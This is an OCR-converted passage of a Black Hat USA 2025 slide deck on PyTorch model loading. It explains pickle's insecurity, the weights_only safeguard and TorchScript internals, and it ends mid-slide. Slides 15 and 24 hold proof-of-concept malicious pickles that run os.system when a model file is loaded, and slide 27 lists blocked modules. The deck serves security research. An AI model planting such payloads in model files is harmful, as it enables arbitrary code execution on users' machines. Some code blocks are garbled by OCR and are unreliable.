---
title: "Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch"
speakers: ["Ji'an Zhou", "Li'shuo Song"]
conference: "Black Hat"
conference_full: "Black Hat USA 2025"
edition: "USA"
year: 2025
source_pdf: "BlackHat_USA_2025_Slides/Ji'an Zhou&Li'shuo Song_Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch.pdf"
pages: 125
sha256: "244af063d612c1816790893f8d35f9b528bb8fea1656b7ec5c973015789d9534"
text_chars: 67049
ocr_pages: 56
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.2
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 1
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:15:32Z"
---
# Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch

**Speakers:** Ji'an Zhou, Li'shuo Song  
**Conference:** Black Hat USA 2025  
**Source:** `BlackHat_USA_2025_Slides/Ji'an Zhou&Li'shuo Song_Safe Harbor or Hostile Waters Unveiling the Hidden Perils of the TorchScript Engine in PyTorch.pdf` (125 pages)


## Slide 1

##### Safe Harbor or Hostile Waters: Unveiling the Hidden Perils of the TorchScript Engine in PyTorch

Ji’an Zhou, Lishuo Song

1 #BHUSA @BlackHatEvents

## Slide 2

## About Us

###### **`Ji'an Zhou`**

- `Security Engineer from Alibaba Cloud`

- `Twitter: @azraelxuemo`

###### **`Lishuo Song`**

- `Security Engineer from Alibaba Cloud`

- `Twitter: @ret2ddme`

2 #BHUSA @BlackHatEvents

## Slide 3

## Agenda

Introduction & Background

TorchScript 101

Where It All Began

The Impact

How weights_only Works

Defense & Summary

3 #BHUSA @BlackHatEvents

## Slide 4

#### Introduction to PyTorch

4 #BHUSA @BlackHatEvents

## Slide 5

###### What Is PyTorch?

5 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What Is PyTorch?
What is PyTorch?
PyTorch is a machine learning framework based on the Torch ML library.
* Developed by Facebook in 2016
Key Features:
¢ Dynamic computation graphs
* Tensors are n-dimensional arrays e
¢ Neural network module PyTo CC h
¢ GPU Support
5
#BHUSA @BlackHatEvents
```

## Slide 6

###### PyTorch Key Use Cases

6

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
PyTorch Key Use Cases
PyTorch
Deep Learning NLP Computer Vision
Research
6
#BHUSA @BlackHatEvents
```

## Slide 7

###### ML Frameworks

7 #BHUSA @BlackHatEvents

## Slide 8

###### Market Share

8 #BHUSA @BlackHatEvents

https://paperswithcode.com/trends


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Market Share
Trends
Frameworks
Paper Implementations grouped by framework
Share of Implementations
100%
75%
50%
25%
0%
Jun21
@ Other languages and frameworks
@ PyTorch
@ TensorFlow
@ Jax
MXNet
@ PaddlePaddle
torch
@ Caffe2
@ Mindspore
Sep 21 Dec 21 Mar 22
Jun 22
Sep 22 Dec 22 Mar 23 Jun 23 Sep 23 Dec 23
Repository Creation Date
https://paperswithcode.com/trends
Mar 24
Quarter
Jun 24
4
2021-06-05 to 2025-06-05
Sep 24
Dec 24
Mar 25 Jun 25
8
#BHUSA @BlackHatEvents
```

## Slide 9

#### Where It All Began

9 #BHUSA @BlackHatEvents

## Slide 10

###### Initially, Use Pickle to Save Model

10 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Initially, Use Pickle to Save Model
© PyTorch
Python Objects Binary File
pickle.dump()
key: value
key: value | > 01011
key: value 0011001
010
Objects in Bytes
Using Python methods to describe process
10
#BHUSA @BlackHatEvents
```

## Slide 11

###### Pickle Is Not Safe

11

**https://docs.python.org/3/library/pickle.html**

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pickle Is Not Safe
Warning: The pickle module is not secure. Only unpickle data you trust.
It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never
unpickle data that could have come from an untrusted source, or that could have been tampered with.
Consider signing data with hmac if you need to ensure that it has not been tampered with.
Safer serialization formats such as json may be more appropriate if you are processing untrusted data. See
Comparison with json.
11
https://docs.python.org/3/library/pickle.html
```

## Slide 12

###### Community Discussion

12

https://github.com/pytorch/pytorch/issues/52596

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Community Discussion
© pytorch / pytorch Q Type (7) tc
<> Code ©) Issues 5k+ $1 Pullrequests 1.3k © Actions [F Projects 12 © wiki © Security 2 l~ Insights
pickle is a security issue #52596
KOLANICH opened on Feb 22, 2021 - edited by pytorch-bot Edits
8
# Feature
We need to do something with it.
Motivation
Pickle is a security issue that can be used to hide backdoors. Unfortunately lots of projects keep using torch.save and
12
https://github.com/pytorch/pytorch/issues/52596
```

## Slide 13

###### Introducing weights_only Parameter

13

https://github.com/pytorch/pytorch/pull/86812

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Introducing weights_only Parameter
© pytorch / pytorch Q Type (/) to sear
<> Code ©) Issues 5k+ $4 Pullrequests 13k ©) Actions fF Projects 12 ] wiki © Security 2 |l~ Insights
Add weights_only option to torch. load #86812
waeles-me malfet wants to merge 13 commits into master from malfet/safer-unpickler (Q)
) Conversation 34 > Commits 13 fl Checks 0 Files changed 3
~ malfet commented on Oct 13, 2022 - edited ~ Contributor ) °°
This addresses the security issue in default Python's unpickler that allows arbitrary code execution while unpickling.
Restrict classes allowed to be unpicked toin None, int, bool, str, float, list, tuple, dict / OrderedDict as well
as torch.Size, torch.nn.Param as wellas torch.Tensor and torch.Storage variants.
Defaults weights_only is setto False , but allows global override to safe only load via TORCH_FORCE_WEIGHTS_ONLY_LOAD
environment variable.
To some extent, addresses #52596
https://github.com/pytorch/pytorch/pull/8681 2
13
```

## Slide 14

###### Implementation

14 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
implementation
return _legacy_load opened_file, map_location,|_weights_only_unpickler
1 def load
2 f: FILE_LIKE,
3 map_location: MAP_LOCATION = None,
4 pickle_module: Any = None,
6 weights_only: Optional bool = None,
7 mmap: Optional bool = None,
8 *kpickle_load_args: Any
10 if weights_only is None:
11 weights_only, warn_weights_only = False, True
13 if weights_only:
14
15 else:
16 if pickle_module is None:
17 pickle_module = pickle
18
19 with _open_file_like f, '‘rb') as opened_file:
20 if weights_only:
21
22 return _legacy_load
23 opened_file, map_location} pickle_module,
24
*kpickle_load_args
14
```

## Slide 15

###### Try It Out: weights_only=False

15

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Try It Out: weights_only=False
import pickle
import os
class evil(): 1 import torch
def __reduce_ (self): 2 torch. load("evil.pth")
return (os.system, ("“whoami", ))
with open("evil.pth","wb") as f:
pickle.dump(evil(),f)
sh-3.2# python3 exp.py
/private/tmp/exp.py:3: FutureWarning: You are using ‘torch.load* with ‘weight
ses the default pickle module implicitly. It is possible to construct malicic
uring unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.n
release, the default value for ‘weights_only* will be flipped to ‘True’. This
g unpickling. Arbitrary objects will no longer be allowed to be loaded via tt
the user via ‘torch.serialization.add_safe_globals*. We recommend you start gs
you don't have full control of the loaded file. Please open an issue on GitHt
ure.
torch.load("evil.pth")
root |
15
```

## Slide 16

###### Try It Out: weights_only=True

16

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Try It Out: weights_only=True
sh-3.2# python3 exp.py
import torch
torch. load("“evil.pth",weights_only=True)
/Library/Python/3.9/site—packages/torch/_weights_only_unpickler.py:402: UserWarning: Detected pickle protocol 4 in the checkpoi
nt, which was not the default pickle protocol used by ‘torch.load* (2). The weights_only Unpickler might not support all instru
ctions implemented by this protocol, please file an issue for adding support if you encounter this.
warnings.warn(
Traceback (most recent call last):
File "/private/tmp/exp.py", line 2, in <module>
File "/Library/Python/3.9/site-packages/torch/serialization.py", line 1383, in load
raise pickle.UnpicklingError( get wo message(str(e))) from None
_pickle.UnpicklingError:
Weights only load failed.| Re-running “torch.load* with ‘weights_only* set to “False* will likely succe
ed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
Please file an issue with the following so that we can make ‘weights_only=True~ compatible with your use case: WeightsUnpickler
error: Unsupported operand 149
16
```

## Slide 17

###### Official Security Statement

17

https://github.com/pytorch/pytorch/security

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Official Security Statement
= rw) pytorch / pytorch Q Type ([/) to search
<> Code © Issues 5k+ 3] Pullrequests 13k ©) Actions [FH Projects 12 © wiki © Security 2 l~ Insights
Security
SECURITY.md
Security Policy
¢ Reporting a Vulnerability
¢ Using Pytorch Securely
o Untrusted models
Untrusted models
Be careful when running untrusted models. This classification includes models created by unknown developers or utilizing data obtained
from unknown sources"),
Prefer to execute untrusted models within a secure, isolated environment such as a sandbox (e.g., containers, virtual machines). This
helps protect your system from potentially malicious code. You can find further details and instructions in this page.
Be mindful of risky model formats. Give preference to share and load weights with the appropriate format for your use case. safetensors
gives the most safety but is the most restricted in what it supports. lto rch. load with weights_only=True is also secure to our knowledge |
even though it offers significantly larger surface of attack. Loading un-trusted checkpoint with weights_only=False MUST never be done.
Important Note: The trustworthiness of a model is not binary. You must always determine the proper level of caution depending on the
specific model and how it matches your use case and risk tolerance.
https://github.com/pytorch/pytorch/security
17
```

## Slide 18

###### Community Trust in weights_only: A Case Study

18

https://github.com/vllm-project/vllm/security/advisories/GHSA-rh4j-5rhw-hr54

#BHUSA @BlackHatEvents

## Slide 19

###### Patch

19 #BHUSA @BlackHatEvents

https://github.com/vllm-project/vllm/pull/12366


> Recovered by OCR — confidence 76/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Patch
Set weights_only=True when using torch.load() #12366
Siete mgoin merged 1 commit into vllm-project:main from russellb:GHSA-rh4j—5rhw-hr54 (D on Jan 24
T)) Conversation 5 > Commits 1 fl Checks 7 Files changed 4
rl Changes from all commits ~ File filter Conversationsy 3 ~ 0/4 files viewed &
Q Filter changed files v > 2 vllm/assets/image.py (O)
Vv BB vilm a @@ -26,4 +26,4 @@ def image_embeds(self) -> torch.Tensor:
21 27 image_path = get_vllm_public_assets(filename=f"{self.name}.pt",
29 - return torch. load(image_path, map_location="cpu")
v @& lora 29° + return torch. load(image_path, map_location="cpu", weights_only=True)
ha weight_utils.py & an @@ -273,7 +273,8 @@ def from_local_checkpoint (
273 273 new_embeddings_tensor_path)
v 1 prompt_adapter 274 274 elif os.path.isfile(new_embeddings_bin_file_path):
| utils.py & 215 275 embeddings = torch. load(new_embeddings_bin_file_path,
276 - map_location=device)
276 + map_location=device,
ein + weights_only=True)
https://github.com/vllm-project/vilm/pull/12366
```

## Slide 20

###### Follow the Crowd?

20 #BHUSA @BlackHatEvents

## Slide 21

#### How weights_only Works

21 #BHUSA @BlackHatEvents

## Slide 22

🤠 `Before we analyze how weights_only is implemented, we need to understand how pickle works.`

22

#BHUSA @BlackHatEvents

## Slide 23

###### load_global

23 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
load_global
1 GLOBAL = b'c'
2 def load_global(self):
3 module = self.readline() [:-1].decode("utf-8")
4 name = self.readline() [:-1].decode("utf-8")
5 klass = self.find_class(module, name)
self.append(klass)
dispatch[GLOBAL[@]] = load_global
ii import pickle
NJ
W
C
def find_class(self, module, name):
# Subclasses may override this.
sys.audit('pickle.find_class', module, name)
if self.proto < 3 and self.fix_imports:
if (module, name) in _compat_pickle.NAME_MAPPING:
module, name = _compat_pickle.NAME_MAPPING[(module, name) ]
elif module in _compat_pickle. IMPORT_MAPPING:
module = _compat_pickle. IMPORT_MAPPING [module]
__import__(module, level=0)
if self.proto >= 4:
return _getattribute(sys.modules [module], name) [0]
else:
return getattr(sys.modules [module], name)
self.stack
Vv [<function system at 0x10289e700>]
> <function system at 0x10289e700>
1
Protected Attributes
23
```

## Slide 24

###### load_unicode & load_tuple1

24 #BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
load_unicode & load_tuple1

1    pickle.loads(b"cos\nsystem\nVwhoami\n\x85")
                                 [red box around: Vwhoami\n\x85]

1  UNICODE = b'V'
2  def load_unicode(self):
3      self.append(str(self.readline()[:-1], 'raw-unicode-escape'))
4  dispatch[UNICODE[0]] = load_unicode

1  TUPLE1 = b'\x85'
2  def load_tuple1(self):
3      self.stack[-1] = (self.stack[-1],)
4  dispatch[TUPLE1[0]] = load_tuple1

self.stack
  v result = {list: 2} [<function system at 0x10443e700>, 'whoami']
    > 0 = {function} <function system at 0x10443e700>
      1 = {str} 'whoami'
      __len__ = {int} 2

self.stack
  v result = {list: 2} [<function system at 0x10443e700>, ('whoami',)]
    > 0 = {function} <function system at 0x10443e700>
    > 1 = {tuple: 1} ('whoami',)
      __len__ = {int} 2

24
#BHUSA  @BlackHatEvents
```

## Slide 25

###### load_reduce

25

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
load reduce
REDUCE = b'R'
def load_reduce(self):
stack = self.stack
args = stack.pop()
func = stack[-1]
stack[-1] = func(xargs)
dispatch[REDUCE[@]] = load_reduce
def Load_reduce( Ne
stack = .stack
args = stack.pop()
func = stack[-1]
stack[-1] = funk(«args)
dispatch[REDUCE[0]]] > = <function system at 0x100c4a700>
©
25
```

## Slide 26

###### 🧐 `How does weights_only address this issue?`

26

#BHUSA @BlackHatEvents

## Slide 27

###### Restricted load_global

27

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Restricted load_global
if key[0] == GLOBAL[@]:
module = readline() [:-1].decode("“utf-8")
name = readline() [:-1].decode("utf-8")
full_path = f''{module}.{name}"
if module in _blocklisted_modules:
raise UnpicklingError(
f"Trying to load unsupported GLOBAL {full_path} whose module {module} is blocked."
)
if full_path in _get_allowed_globals():
self.append(_get_allowed_globals() [full_path] )
elif full_path in _get_user_allowed_globals():
self.append(_get_user_allowed_globals() [full_path] )
else:
raise UnpicklingError(
f"Unsupported global: GLOBAL {full_path} was not an allowed global by default. "
f"Please use ‘torch.serialization.add_safe_globals([{name}])* to allowlist "
“this global if you trust this class/function."
module in _blocklisted_modules:
aise UnpickLingE
['sys', 'os', 'posix', 'nt']
_get_user_allowed_globals()|
_get_allowed_globals()
=]
=
=
o
=]
=
a
e {'_codecs.encode': <built-in function encode>, ‘built!
‘collections.OrderedDict' = <class 'collections.OrderedDict'>
‘collections.Counter' = <class 'collections.Counter'>
‘torch.nn.parameter.Parameter' = <class 'torch.nn
'torch.serialization._get_layout' = <function _get_layout a
'torch.Size' = <class 'torch.Size'>
‘torch.Tensor' = <class 'torch.Tensor'>
```

## Slide 28

###### Restricted load_reduce

28 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
oon an
Restricted load reduce
elif key[@] == REDUCE[@]:
args = self.stack.pop()
func = self.stack[-1]
if. (
func not in _get_allowed_globals().values()
and func not in _get_user_allowed_globals().values()
raise UnpicklingError(
f"Trying to call reduce for unrecognized function {func}"
)
self.stack[-1] = func(xargs)
_get_user_allowed_globals()|
000
=]
S
=
=
=I
=
= {'_codecs.encode': <built-in function encode>, ‘built
‘collections.OrderedDict' = <class 'collections.OrderedDict'>
‘collections.Counter' = <class 'collections.Counter'>
'torch.nn.parameter.Parameter' = <class 'torch.nn
'torch.serialization._get_layout' = <function _get_layout a
'torch.Size' = <class 'torch.Size'>
'torch.Tensor' = <class 'torch.Tensor'>
```

## Slide 29

###### 😕 How to Bypass?

29 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© How to Bypass?
Whitelist & Blacklist
#BHUSA @BlackHatEvents
```

## Slide 30

###### 😭 No Useful Results from Whitelist Analysis

30 #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@ No Useful Results from Whitelist Analysis
{
_codecs.encode': <built-infunctionencode>,
‘puiltins.bytearray': <class'bytearray'>,
‘collections.Counter': <class'collections.Counter'>,
‘collections.OrderedDict': <class'collections.OrderedDict'>,
‘torch.BFloat16Storage': StorageType(dtype=torch.bfloat16),
‘torch.BoolTensor': <class'torch.BoolTensor'>,
'torch.ByteStorage': StorageType(dtype=torch.uint8),
‘torch.ByteTensor': <class'torch.ByteTensor'>,
‘torch.CharTensor': <class'torch.CharTensor'>,
‘torch.ComplexFloatStorage'’: StorageType(dtype=torch.complex64),
‘torch.DoubleTensor': <class'torch.DoubleTensor'>,
'torch.FloatStorage': StorageType(dtype=torch.float32),
‘torch.FloatTensor': <class'torch.FloatTensor'>,
#BHUSA @BlackHatEvents
```

## Slide 31

I was ready to call it quits — until I thought, "Why not try something different?"

31 #BHUSA @BlackHatEvents

## Slide 32

###### Full Analysis

32

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Full Analysis
def load(
f: FILE_LIKE,
1
2
4 weights_only: Optional[bool] = None,
5) -—> Any:
7 with _open_file_like(f, “rb'') as opened_file:
8
9
if _is_zipfile(opened_file):
with _open_zipfile_reader(opened_file) as opened_zipfile:
10 if _is_torchscript_zip(opened_zipfile):
11
12 return |torch. jit. load(opened_file, map_location=map_location)
13 if weights_only:
14 return _load(
15 opened_zipfile,
16 map_location,
17 _weights_only_unpickler,
18 overall_storage=overall_storage,
19 *kpickle_load_args,
20 )
21 if weights_only:
22 return _legacy_load(
23 opened_file,
24 map_location,
25 _weights_only_unpickler,
26 *kpickle_load_args, 32
27 ) #BHUSA @BlackHatEvents
```

## Slide 33

###### What Is torch.jit.load?

33

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What Is torch.jit.load?
Go gle torch.jit.load
6 PyTorch
https://pytorch.org » docs » stable » generated > torch.ji... ?
torch.jit.load
Load a ScriptModule or ScriptFunction previously saved with torch.jit.save . All previously saved
modules, no matter their device, are first loaded onto CPU, ...
6 PyTorch Forums
TorchScript |model loading guidance - jit
Jun 16, 2022 — Traditional way for loading the saved weights is to, first initialize the model and load
the saved weights like the below steps.
Comparison between saving the whole model, saving only .... Jan 25, 2024
Error in loading the model - jit - PyTorch Forums Jun 8, 2020
More results from discuss.pytorch.org
33
#BHUSA @BlackHatEvents
```

## Slide 34

#### TorchScript 101

34

#BHUSA @BlackHatEvents

## Slide 35

###### What is TorchScript?

###### **`Overview`**

\```
An intermediate representation (IR) of
PyTorch
\```

###### **`Goal`**

- `Convert PyTorch code into a portable format for efficient execution in environments without Python interpreter, such as C++ and mobile`

Serialized
TorchScript
Python Model
Code
(model.pt)
Execution
envirment
(c++\Mobile)

35

#BHUSA @BlackHatEvents

## Slide 36

###### Python to TorchScript -- Overview

###### `Python Code`

###### `Python AST`

###### `JIT AST`

\```
@torch.jit.script
defmodel(x:torch.Tensor):
ifx.sum()>0:
y=x*2
else:
y=x+2
returny
\```

Module(
body=[
FunctionDef(
(def
name='model',
(ident model)
args=arguments(
(decl
posonlyargs=[],
(list
args=[
(param
arg(
(ident x)
arg='x',
annotation=Name( (option
(variable (ident Tensor)))
(option)
id='Tensor', ctx=Load()))],
(False)))
kwonlyargs=[],
(option))
kw_defaults=[],
...
defaults=[]),
(return (variable (ident y)))))
body=[
If(...),
Return(
value=Name(id='y', ctx=Load()))],
decorator_list=[])],
type_ignores=[])

36

#BHUSA @BlackHatEvents

## Slide 37

###### Python to TorchScript -- Overview

###### `original IR graph`

###### `optimized IR graph`

\```
graph(%x.1 : Tensor):
\```

- `%9 : int = prim::Constant[value=2]() #`

- `poc.py:6:10`

- `%4 : int = prim::Constant[value=0]() #`

- `poc.py:5:14`

- `= prim::Store[name="x"](%x.1) #`

- `poc.py:4:10`

   - `%x.3 : Tensor = prim::Load[name="x"]()`

   - `%2 : NoneType = prim::Constant()`

- `%3 : Tensor = aten::sum(%x.3, %2) #`

- `poc.py:5:4`

   - `%5 : Tensor = aten::gt(%3, %4) #  poc.py:5:4`

   - `%6 : int = prim::Constant[value=0]()`

   - `%7 : bool = aten::Bool(%5) #  poc.py:5:4 = prim::If(%7) #  poc.py:5:1 block0():`

         - `%x.5 : Tensor = prim::Load[name="x"]()`

- `%y.1 : Tensor = aten::mul(%x.5, %9) #`

- `poc.py:6:6`

- `= prim::Store[name="y"](%y.1) #`

- `poc.py:6:2`

      - `%y.7 : Tensor = prim::Load[name="y"]() %y.9 : Tensor = prim::Load[name="y"]() -> ()`

      - `block1():`

\```
graph(%x.1 : Tensor):
\```

   - `%12 : int = prim::Constant[value=1]()`

   - `%2 : NoneType = prim::Constant() %4 : int = prim::Constant[value=0]()`

- `#  poc.py:5:14`

   - `%9 : int = prim::Constant[value=2]()`

- `#  poc.py:6:10`

- `%3 : Tensor = aten::sum(%x.1, %2) #`

- `poc.py:5:4`

- `%5 : Tensor = aten::gt(%3, %4) #`

- `poc.py:5:4`

- `%7 : bool = aten::Bool(%5) #`

- `poc.py:5:4`

\```
%y : Tensor = prim::If(%7) #
poc.py:5:1
block0():
%y.1 : Tensor = aten::mul(%x.1,
%9) #  poc.py:6:6
-> (%y.1)
block1():
%y.3 : Tensor = aten::add(%x.1,
%9, %12) #  poc.py:8:6
-> (%y.3)
return (%y)
\```

- `%x : Tensor = prim::Load[name="x"]() %12 : int = prim::Constant[value=1]()`

37 #BHUSA @BlackHatEvents

## Slide 38

###### Python to TorchScript – Function and Module

###### `Function`

###### `Module`

class SimpleModel(nn.Module):
def __init__(self):
def model(x: torch.Tensor):
super(SimpleModel, self).__init__()
if x.sum() > 0:
y = x * 2
def forward(self, x: torch.Tensor):
else:
if x.sum() > 0:
y = x + 2
y = x * 2
return y else:
y = x + 2
return y

38 #BHUSA @BlackHatEvents

## Slide 39

###### Python to TorchScript -- Function

\```
Python AST
Python FunctionJIT ASTIR
def_script_impl(
...
ast=get_jit_def(obj,obj.__name__)
if_rcbisNone:
_rcb=_jit_internal.createResolutionCallbackFromClosure(obj)
fn=torch._C._jit_script_compile(
qualified_name,ast,_rcb,get_default_args(obj)
)
#Forwarddocstrings
fn.__doc__=obj.__doc__
fn.__name__="ScriptFunction"
fn.__qualname__="torch.jit.ScriptFunction"
...
returnfn
...
\```

39

#BHUSA @BlackHatEvents

## Slide 40

###### Python to TorchScript -- Function

\```
Python AST
Python FunctionJIT ASTIR
def_script_impl(
...
ast=get_jit_def(obj,obj.__name__)
if_rcbisNone:
_rcb=_jit_internal.createResolutionCallbackFromClosure(obj)
fn=torch._C._jit_script_compile(
qualified_name,ast,_rcb,get_default_args(obj)
)
#Forwarddocstrings
fn.__doc__=obj.__doc__
fn.__name__="ScriptFunction"
fn.__qualname__="torch.jit.ScriptFunction"
...
returnfn
...
\```

40

#BHUSA @BlackHatEvents

## Slide 41

###### Python to TorchScript -- Function

\```
Python AST
Python FunctionJIT ASTIR
def_script_impl(
...
ast=get_jit_def(obj,obj.__name__)
if_rcbisNone:
_rcb=_jit_internal.createResolutionCallbackFromClosure(obj)
fn=torch._C._jit_script_compile(
qualified_name,ast,_rcb,get_default_args(obj)
)
#Forwarddocstrings
fn.__doc__=obj.__doc__
#0torch::jit::to_ir::to_ir
fn.__name__="ScriptFunction"
fn.__qualname__="torch.jit.ScriptFunction"
#1torch::jit::CompilationUnit::define
...
return#2fnscript_compile_function
...#3_jit_script_compile
\```

41

#BHUSA @BlackHatEvents

## Slide 42

###### Python to TorchScript -- Module

\```
Pythonnn.Module
\```

\```
Python Functions
\```

\```
Python AST
\```

\```
JIT AST
\```

\```
IR
\```

\```
defcreate_script_module_impl(nn_module,concrete_type,stubs_fn):
\```

\```
...
\```

\```
cpp_module=torch._C._create_module_with_type(concrete_type.jit_type)
method_stubs=stubs_fn(nn_module)
property_stubs=get_property_stubs(nn_module)
hook_stubs,pre_hook_stubs=get_hook_stubs(nn_module)
ignored_properties=jit_ignored_properties(nn_module)
...
\```

\```
#Compilemethodsifnecessary
\```

\```
ifconcrete_typenotinconcrete_type_store.methods_compiled:
create_methods_and_properties_from_stubs(
\```

\```
concrete_type,method_stubs,property_stubs
)
\```

\```
...
\```

42

#BHUSA @BlackHatEvents

## Slide 43

###### Python to TorchScript -- Module

\```
Pythonnn.Module
\```

\```
Python Functions
\```

\```
Python AST
\```

\```
JIT AST
\```

\```
IR
\```

\```
defcreate_script_module_impl(nn_module,concrete_type,stubs_fn):
\```

\```
...
\```

\```
cpp_module=torch._C._create_module_with_type(concrete_type.jit_type)
method_stubs=stubs_fn(nn_module)
\```

\```
property_stubs=get_property_stubs(nn_module)
hook_stubs,pre_hook_stubs=get_hook_stubs(nn_module)alias infer_methods_to_compile
ignored_properties=jit_ignored_properties(nn_module)
...
#Compilemethodsifnecessary
\```

\```
ifconcrete_typenotinconcrete_type_store.methods_compiled:
create_methods_and_properties_from_stubs(
\```

\```
concrete_type,method_stubs,property_stubs
)
\```

\```
...
\```

43

#BHUSA @BlackHatEvents

## Slide 44

###### Python to TorchScript -- Module

\```
Python AST
Pythonnn.ModulePython FunctionsJIT AST
definfer_methods_to_compile(nn_module):
...
exported=[]
fornameindir(nn_module):
ifnameinignored_properties:
continue
item=getattr(nn_module,name,None)
if(
_jit_internal.get_torchscript_modifier(item)
is_jit_internal.FunctionModifiers.EXPORT
):
exported.append(name)
\```

IR

\```
methods=methods+exported
\```

\```
...
\```

\```
stubs=[make_stub_from_method(nn_module,method)formethodinmethods]
returnoverload_stubs+stubs
\```

44

#BHUSA @BlackHatEvents

## Slide 45

###### Python to TorchScript -- Module

\```
Python AST
Pythonnn.ModulePython FunctionsJIT AST
\```

IR

\```
definfer_methods_to_compile(nn_module):
...
exported=[]
fornameindir(nn_module):
ifnameinignored_properties:
continue
item=getattr(nn_module,name,None)
if(
_jit_internal.get_torchscript_modifier(item)
is_jit_internal.FunctionModifiers.EXPORT
):
exported.append(name)
methods=methods+exported
...
stubs=[make_stub_from_method(nn_module,method)formethodinmethods]
returnoverload_stubs+stubs
\```

45

#BHUSA @BlackHatEvents

## Slide 46

###### Python to TorchScript -- Module

\```
Pythonnn.Module
\```

\```
Python Functions
\```

\```
Python AST
\```

\```
JIT AST
\```

\```
IR
\```

\```
defcreate_script_module_impl(nn_module,concrete_type,stubs_fn):
\```

\```
...
cpp_module=torch._C._create_module_with_type(concrete_type.jit_type)
method_stubs=stubs_fn(nn_module)
property_stubs=get_property_stubs(nn_module)
hook_stubs,pre_hook_stubs=get_hook_stubs(nn_module)
ignored_properties=jit_ignored_properties(nn_module)
...
#Compilemethodsifnecessary
ifconcrete_typenotinconcrete_type_store.methods_compiled:
create_methods_and_properties_from_stubs(
concrete_type,method_stubs,property_stubs
)
\```

\```
...
\```

46

#BHUSA @BlackHatEvents

## Slide 47

###### Python to TorchScript -- Module

Python AST
Python nn.Module Python Functions JIT AST IR
def create_script_module_impl(nn_module, concrete_type, stubs_fn):
#0 torch::jit::to_ir::to_ir
...
cpp_module#1 torch::jit::CompilationUnit::define= torch._C._create_module_with_type(concrete_type.jit_type)
method_stubs = stubs_fn(nn_module)
property_stubs#2 _create_methods_and_properties= get_property_stubs(nn_module)
hook_stubs, pre_hook_stubs = get_hook_stubs(nn_module)
#3 create_methods_and_properties_from_stubs
ignored_properties = jit_ignored_properties(nn_module)
...
# Compile methods if necessary
if concrete_type not in concrete_type_store.methods_compiled:
create_methods_and_properties_from_stubs(
concrete_type, method_stubs, property_stubs
)
...

47

#BHUSA @BlackHatEvents

## Slide 48

###### TorchScript Serialization

IR graph

ScriptModule torch.save() torch.load()

module.pt ScriptModule
ScriptFunction
Printed Code

def forward(self,
x: Tensor) -> Tensor:
if bool(torch.gt(torch.sum(x), 0)):
y = torch.mul(x, 2)
else:
y = torch.add(x, 2)
return y

48 #BHUSA @BlackHatEvents

## Slide 49

###### TorchScript Serialization -- save

data.pkl
ScriptFunction
Ivalue
addFunctionToModule
code/
ScriptModuleSerial
python code/debug
ScriptModule
izer::serialize() info
constants.pkl
tensor

49 #BHUSA @BlackHatEvents

## Slide 50

###### TorchScript Serialization -- save

\```
voidScriptModuleSerializer::serialize(
constModule&module,
\```

\```
...
writeArchive(
module._ivalue(),
/*archive_name=*/"data",
